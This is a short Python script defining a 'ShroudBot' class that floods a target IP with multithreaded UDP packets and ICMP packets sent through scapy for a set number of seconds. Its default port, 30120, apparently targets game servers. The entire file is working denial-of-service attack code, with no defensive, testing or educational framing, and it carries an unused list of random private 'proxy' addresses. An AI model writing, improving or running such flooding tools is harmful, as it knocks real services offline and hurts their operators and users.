import socket
import threading
import time
import random
import struct
import logging
from scapy.all import IP, UDP, ICMP, send

# ڕێکخستنی لوگینگ
logging.basicConfig(format='[%(levelname)s] %(message)s', level=logging.INFO)

class ShroudBot:
    def __init__(self, target_ip, target_port=30120):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.proxy_ips = [f"192.168.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(50)]

    def udp_flood_with_rotation(self):
        logging.info("UDP Flood Started...")
        while self.running:
            size = random.randint(64, 1400)
            payload = b'\xff\xff\xff\xff' + b'\x00' * (size - 4)
            for _ in range(5):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    sock.close()
                except Exception as e:
                    pass

    def icmp_flood(self):
        logging.info("ICMP Flood Started...")
        while self.running:
            packet = IP(dst=self.target_ip)/ICMP()
            send(packet, verbose=0)

    def start_attack(self, duration=60):
        self.running = True
        threads = []
        
        for i in range(5):
            t = threading.Thread(target=self.udp_flood_with_rotation)
            threads.append(t)
            t.start()
        
        for i in range(2):
            t = threading.Thread(target=self.icmp_flood)
            threads.append(t)
            t.start()

        logging.info(f"Attack running for {duration} seconds...")
        time.sleep(duration)
        self.running = False
        logging.info("Attack Stopped.")
